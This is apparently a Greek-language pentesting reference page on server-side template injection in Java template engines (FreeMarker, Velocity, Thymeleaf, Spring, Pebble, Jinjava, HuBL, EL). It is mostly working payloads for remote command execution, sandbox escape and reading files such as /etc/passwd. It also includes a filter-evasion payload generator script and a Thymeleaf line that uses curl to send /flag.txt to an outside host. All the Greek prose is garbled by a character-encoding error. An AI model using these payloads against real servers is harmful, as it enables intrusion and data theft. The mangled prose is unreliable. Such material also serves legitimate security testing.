ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Ï„Î± payloads ÏƒÎ±Ï‚ ÏƒÏ„Î¿ [https://try.freemarker.apache.org](https://try.freemarker.apache.org)

* `{{7*7}} = {{7*7}}`
* `${7*7} = 49`
* `#{7*7} = 49 -- (legacy)`
* `${7*'7'} Nothing`
* `${foobar}`
```java
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}

${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```
**Freemarker - Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î±Î¼Î¼ÏÎ´Î¿Ï…Ï‚ Ï‡ÏÏÎ¿Ï…**

âš ï¸ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î¼ÏŒÎ½Î¿ ÏƒÎµ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Freemarker ÎºÎ¬Ï„Ï‰ Î±Ï€ÏŒ 2.3.30
```java
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± FreeMarker Ï„Î¿Ï… [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker)

### Velocity (Java)
```java
// I think this doesn't work
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end

// This should work?
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("cat%20/flag563378e453.txt"))
#set($out=$process.getInputStream())
#set($null=$process.waitFor() )
#foreach($i+in+[1..$out.available()])
$out.read()
#end
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* Î£Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Velocity Ï„Î¿Ï… [https://portswigger.net/research/server-side-template-injection](https://portswigger.net/research/server-side-template-injection)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#velocity)

### Thymeleaf

Î£Ï„Î¿ Thymeleaf, Î­Î½Î± ÎºÎ¿Î¹Î½ÏŒ Ï„ÎµÏƒÏ„ Î³Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ SSTI ÎµÎ¯Î½Î±Î¹ Î· Î­ÎºÏ†ÏÎ±ÏƒÎ· `${7*7}`, Î· Î¿Ï€Î¿Î¯Î± Î¹ÏƒÏ‡ÏÎµÎ¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½. Î“Î¹Î± Ï€Î¹Î¸Î±Î½Î® ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ±, Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:

*   SpringEL:

```java
${T(java.lang.Runtime).getRuntime().exec('calc')}
```
*   OGNL:

```java
${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("calc")}
```

Î¤Î¿ Thymeleaf Î±Ï€Î±Î¹Ï„ÎµÎ¯ Î±Ï…Ï„Î­Ï‚ Î¿Î¹ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÎµÎ½Ï„ÏŒÏ‚ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Ï‰Î½ Î³Î½Ï‰ÏÎ¹ÏƒÎ¼Î¬Ï„Ï‰Î½. Î©ÏƒÏ„ÏŒÏƒÎ¿, Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î· _ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÎºÏ†ÏÎ¬ÏƒÎµÏ‰Î½_ Î³Î¹Î± Î¬Î»Î»ÎµÏ‚ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯ÎµÏ‚ Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÏƒÏÎ½Ï„Î±Î¾Î· ÏŒÏ€Ï‰Ï‚ `[[...]]` Î® `[(...)]`. ÎˆÏ„ÏƒÎ¹, Î­Î½Î± Î±Ï€Î»ÏŒ Ï†Î¿ÏÏ„Î¯Î¿ Î´Î¿ÎºÎ¹Î¼Î®Ï‚ SSTI Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ `[[${7*7}]]`.

Î©ÏƒÏ„ÏŒÏƒÎ¿, Î· Ï€Î¹Î¸Î±Î½ÏŒÏ„Î·Ï„Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±Ï‚ Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… Ï†Î¿ÏÏ„Î¯Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î³ÎµÎ½Î¹ÎºÎ¬ Ï‡Î±Î¼Î·Î»Î®. Î— Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Î¿Ï… Thymeleaf Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î´Ï…Î½Î±Î¼Î¹ÎºÎ® Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½. Î¤Î± Ï€ÏÏŒÏ„Ï…Ï€Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î±. ÎŸÎ¹ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÏ„Î­Ï‚ Î¸Î± Ï‡ÏÎµÎ¹Î±Î¶ÏŒÏ„Î±Î½ Î½Î± Ï…Î»Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ Ï„Î¿Î½ Î´Î¹ÎºÏŒ Ï„Î¿Ï…Ï‚ `TemplateResolver` Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï€ÏÎ¿Ï„ÏÏ€Ï‰Î½ Î±Ï€ÏŒ ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ­Ï‚ ÎµÏ€Î¯ Ï„ÏŒÏ€Î¿Ï…, ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î±ÏƒÏ…Î½Î®Î¸Î¹ÏƒÏ„Î¿.

Î•Ï€Î¯ÏƒÎ·Ï‚, Ï„Î¿ Thymeleaf Ï€ÏÎ¿ÏƒÏ†Î­ÏÎµÎ¹ _Ï€ÏÎ¿ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± ÎµÎºÏ†ÏÎ¬ÏƒÎµÏ‰Î½_, ÏŒÏ€Î¿Ï… Î¿Î¹ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ Î¼Î­ÏƒÎ± ÏƒÎµ Î´Î¹Ï€Î»Î¬ ÎºÎ¬Ï„Ï‰ Ï€Î±ÏÎ»ÎµÏ‚ (`__...__`) Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Î¹ ÏƒÎµ Ï€ÏÎ¿ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î±. Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ ÏƒÏ„Î·Î½ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î® ÎµÎºÏ†ÏÎ¬ÏƒÎµÏ‰Î½, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ Ï„ÎµÎºÎ¼Î·ÏÎ¯Ï‰ÏƒÎ· Ï„Î¿Ï… Thymeleaf:
```java
#{selection.__${sel.code}__}
```
**Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ ÏƒÏ„Î¿ Thymeleaf**

Î›Î¬Î²ÎµÏ„Îµ Ï…Ï€ÏŒÏˆÎ· Ï„Î¿ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ Î±Ï€ÏŒÏƒÏ€Î±ÏƒÎ¼Î± ÎºÏÎ´Î¹ÎºÎ±, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÏƒÎµ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:
```xml
<a th:href="@{__${path}__}" th:title="${title}">
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
Î‘Ï…Ï„ÏŒ Ï…Ï€Î¿Î´Î·Î»ÏÎ½ÎµÎ¹ ÏŒÏ„Î¹ ÎµÎ¬Î½ Î¿ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒÏ‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï… ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÎ¹ÏƒÏŒÎ´Î¿Ï…Ï‚ ÎµÏƒÏ†Î±Î»Î¼Î­Î½Î±, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î±Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î¿Ï… ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ URL ÏŒÏ€Ï‰Ï‚:
```
http://localhost:8082/(7*7)
http://localhost:8082/(${T(java.lang.Runtime).getRuntime().exec('calc')})
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/](https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Î Î»Î±Î¯ÏƒÎ¹Î¿ Spring (Java)
```java
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```
**Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï†Î¯Î»Ï„ÏÏ‰Î½**

ÎœÏ€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Ï€Î¿Î»Î»Î±Ï€Î»Î­Ï‚ Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î­Ï‚ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚, Î±Î½ Ï„Î¿ `${...}` Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ `#{...}`, `*{...}`, `@{...}` Î® `~{...}`.

* Î”Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î¿ `/etc/passwd`
```java
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```
* Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ Î£ÎµÎ½Î¬ÏÎ¹Î¿ Î³Î¹Î± Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Ï†Î¿ÏÏ„Î¯Î¿Ï…
```python
#!/usr/bin/python3

## Written By Zeyad Abulaban (zAbuQasem)
# Usage: python3 gen.py "id"

from sys import argv

cmd = list(argv[1].strip())
print("Payload: ", cmd , end="\n\n")
converted = [ord(c) for c in cmd]
base_payload = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec'
end_payload = '.getInputStream())}'

count = 1
for i in converted:
if count == 1:
base_payload += f"(T(java.lang.Character).toString({i}).concat"
count += 1
elif count == len(converted):
base_payload += f"(T(java.lang.Character).toString({i})))"
else:
base_payload += f"(T(java.lang.Character).toString({i})).concat"
count += 1

print(base_payload + end_payload)
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [Thymleaf SSTI](https://javamana.com/2021/11/20211121071046977B.html)
* [Payloads all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd)

### Î‘Î»Î»Î±Î³Î® Î ÏÎ¿Î²Î¿Î»Î®Ï‚ Spring (Java)
```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```
* [https://github.com/veracode-research/spring-view-manipulation](https://github.com/veracode-research/spring-view-manipulation)

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
{% endcontent-ref %}

### Pebble (Java)

* `{{ ÎºÎ¬Ï€Î¿Î¹Î±Î£Ï…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬.toUPPERCASE() }}`

Î Î±Î»Î¹Î¬ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Pebble ( < Î­ÎºÎ´Î¿ÏƒÎ· 3.0.9):
```java
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
```
ÎÎ­Î± Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… Pebble:
```java
{% raw %}
{% set cmd = 'id' %}
{% endraw %}



{% set bytes = (1).TYPE
.forName('java.lang.Runtime')
.methods[6]
.invoke(null,null)
.exec(cmd)
.inputStream
.readAllBytes() %}
{{ (1).TYPE
.forName('java.lang.String')
.constructors[0]
.newInstance(([bytes]).toArray()) }}
```
### Jinjava (Java)

### Jinjava (Î¤Î¶Î¬Î²Î±)
```java
{{'a'.toUpperCase()}} would result in 'A'
{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
```
**Jinjava - Î•ÎºÏ„Î­Î»ÎµÏƒÎ· ÎµÎ½Ï„Î¿Î»ÏÎ½**

Î”Î¹Î¿ÏÎ¸ÏÎ¸Î·ÎºÎµ Î±Ï€ÏŒ [https://github.com/HubSpot/jinjava/pull/230](https://github.com/HubSpot/jinjava/pull/230)
```java
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#jinjava)

### Hubspot - HuBL (Java)

* `{% %}` Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÏ„Î­Ï‚ Î´Î·Î»ÏÏƒÎµÏ‰Î½
* `{{ }}` Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÏ„Î­Ï‚ ÎµÎºÏ†ÏÎ¬ÏƒÎµÏ‰Î½
* `{# #}` Î´Î¹Î±Ï‡Ï‰ÏÎ¹ÏƒÏ„Î­Ï‚ ÏƒÏ‡Î¿Î»Î¯Ï‰Î½
* `{{ request }}` - com.hubspot.content.hubl.context.TemplateContextRequest@23548206
* `{{'a'.toUpperCase()}}` - "A"
* `{{'a'.concat('b')}}` - "ab"
* `{{'a'.getClass()}}` - java.lang.String
* `{{request.getClass()}}` - class com.hubspot.content.hubl.context.TemplateContextRequest
* `{{request.getClass().getDeclaredMethods()[0]}}` - public boolean com.hubspot.content.hubl.context.TemplateContextRequest.isDebug()

Î‘Î½Î±Î¶Î®Ï„Î·ÏƒÎ· Î³Î¹Î± "com.hubspot.content.hubl.context.TemplateContextRequest" ÎºÎ±Î¹ Î±Î½Î±ÎºÎ¬Î»Ï…ÏˆÎ· Ï„Î¿Ï… [Jinjava project ÏƒÏ„Î¿ Github](https://github.com/HubSpot/jinjava/).
```java
{{request.isDebug()}}
//output: False

//Using string 'a' to get an instance of class sun.misc.Launcher
{{'a'.getClass().forName('sun.misc.Launcher').newInstance()}}
//output: sun.misc.Launcher@715537d4

//It is also possible to get a new object of the Jinjava class
{{'a'.getClass().forName('com.hubspot.jinjava.JinjavaConfig').newInstance()}}
//output: com.hubspot.jinjava.JinjavaConfig@78a56797

//It was also possible to call methods on the created object by combining the



{% raw %}
{% %} and {{ }} blocks
{% set ji='a'.getClass().forName('com.hubspot.jinjava.Jinjava').newInstance().newInterpreter() %}
{% endraw %}


{{ji.render('{{1*2}}')}}
//Here, I created a variable 'ji' with new instance of com.hubspot.jinjava.Jinjava class and obtained reference to the newInterpreter method. In the next block, I called the render method on 'ji' with expression {{1*2}}.

//{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
//output: xxx

//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
//output: java.lang.UNIXProcess@1e5f456e

//RCE with org.apache.commons.io.IOUtils.
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//output: netstat execution

//Multiple arguments to the commands
Payload: {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
//Output: Linux bumpy-puma 4.9.62-hs4.el6.x86_64 #1 SMP Fri Jun 1 03:00:47 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```
**Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**

* [https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html)

### Î“Î»ÏÏƒÏƒÎ± ÎˆÎºÏ†ÏÎ±ÏƒÎ·Ï‚ - EL (Java)

* `${"aaaa"}` - "aaaa"
* `${99999+1}` - 100000.
* `#{7*7}` - 49
* `${{7*7}}` - 49
* `${{request}}, ${{session}}, {{faceContext}}`

Î— Î“Î»ÏÏƒÏƒÎ± ÎˆÎºÏ†ÏÎ±ÏƒÎ·Ï‚ (EL) ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î²Î±ÏƒÎ¹ÎºÎ® Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï€Î¿Ï… Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½ÎµÎ¹ Ï„Î·Î½ Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î±ÏƒÎ·Ï‚ (ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚) ÎºÎ±Î¹ Ï„Î·Ï‚ Î»Î¿Î³Î¹ÎºÎ®Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ (ÏŒÏ€Ï‰Ï‚ Î¿Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½ÎµÏ‚ Î¼Î¿Î½Î¬Î´ÎµÏ‚) ÏƒÏ„Î¿ JavaEE. Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎµÎºÏ„ÎµÎ½ÏÏ‚ ÏƒÎµ Ï€Î¿Î»Î»Î­Ï‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯ÎµÏ‚ JavaEE Î³Î¹Î± Ï„Î·Î½ ÎµÏ€Î¹Ï„Î¬Ï‡Ï…Î½ÏƒÎ· Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚. ÎŸÎ¹ Î²Î±ÏƒÎ¹ÎºÎ­Ï‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯ÎµÏ‚ JavaEE Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ EL Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½:

* **JavaServer Faces (JSF)**: Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ EL Î³Î¹Î± Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Ï‰Î½ ÏƒÎµ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ JSF Î¼Îµ Ï„Î± Î±Î½Ï„Î¯ÏƒÏ„Î¿Î¹Ï‡Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎºÎ±Î¹ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÏƒÎºÎ®Î½Î¹Î¿.
* **JavaServer Pages (JSP)**: Î— EL Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ JSP Î³Î¹Î± Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÎºÎ±Î¹ Ï„Î·Î½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÎ¯Î± Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¹Ï‚ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ JSP, ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ ÎµÏ…ÎºÎ¿Î»ÏŒÏ„ÎµÏÎ· Ï„Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î¿Î¹Ï‡ÎµÎ¯Ï‰Î½ ÏƒÎµÎ»Î¯Î´Î±Ï‚ Î¼Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.
* **Contexts and Dependency Injection for Java EE (CDI)**: Î— EL ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½ÎµÏ„Î±Î¹ Î¼Îµ Ï„Î¿ CDI Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Ï„Î·Î½ Î¬ÏˆÎ¿Î³Î· Î±Î»Î»Î·Î»ÎµÏ€Î¯Î´ÏÎ±ÏƒÎ· Î¼ÎµÏ„Î±Î¾Ï Ï„Î¿Ï… ÎµÏ€Î¹Ï€Î­Î´Î¿Ï… Î¹ÏƒÏ„Î¿Ï ÎºÎ±Î¹ Ï„Ï‰Î½ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Ï‰Î½ Î¼Î¿Î½Î¬Î´Ï‰Î½, ÎµÎ¾Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Î½Ï„Î±Ï‚ Î¼Î¹Î± Ï€Î¹Î¿ ÏƒÏ…Î½ÎµÎºÏ„Î¹ÎºÎ® Î´Î¿Î¼Î® ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î· ÏƒÎµÎ»Î¯Î´Î± Î³Î¹Î± Î½Î± Î¼Î¬Î¸ÎµÏ„Îµ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ **ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Ï„Ï‰Î½ Î´Î¹ÎµÏÎ¼Î·Î½ÎµÏ…Ï„ÏÎ½ EL**:

{% content-ref url="el-expression-language.md" %}
[el-expression-language.md](el-expression-language.md)
